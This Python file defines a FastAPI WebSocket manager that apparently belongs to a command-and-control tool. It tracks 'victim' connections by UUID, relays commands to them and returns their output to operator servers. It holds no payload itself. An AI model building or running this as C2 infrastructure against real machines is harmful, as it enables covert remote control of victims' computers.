from fastapi import WebSocket
from typing import List, Dict

class socketManager:
    def __init__(self):
        self.victimSockets:List[Dict] = []
        self.ServerSockets:List[Dict] = []

    def connectVictim(self, UUID:str, websocket:WebSocket):
        self.victimSockets.append({"UUID":UUID,"socket":websocket})
    
    def connectServer(self, serverID:str, websocket:WebSocket):
        self.ServerSockets.append({"serverID":serverID,"socket":websocket})

    async def sendCommand(self, UUID:str, data:Dict):
        for v in self.victimSockets:
            if v["UUID"] == UUID:
                await v["socket"].send_json(data)
                break

    async def recieveOutput(self, serverID:str, data:Dict):
        for s in self.ServerSockets:
            if s["serverID"] == serverID:
                await s["socket"].send_json(data)
                break

    def disconnectVictim(self, UUID:str):
        for v in self.victimSockets:
            if v["UUID"] == UUID:
                self.victimSockets.remove(v)

    def disconnectServer(self, serverID:str):
        for s in self.ServerSockets:
            if s["serverID"] == serverID:
                self.ServerSockets.remove(s)
                break
        

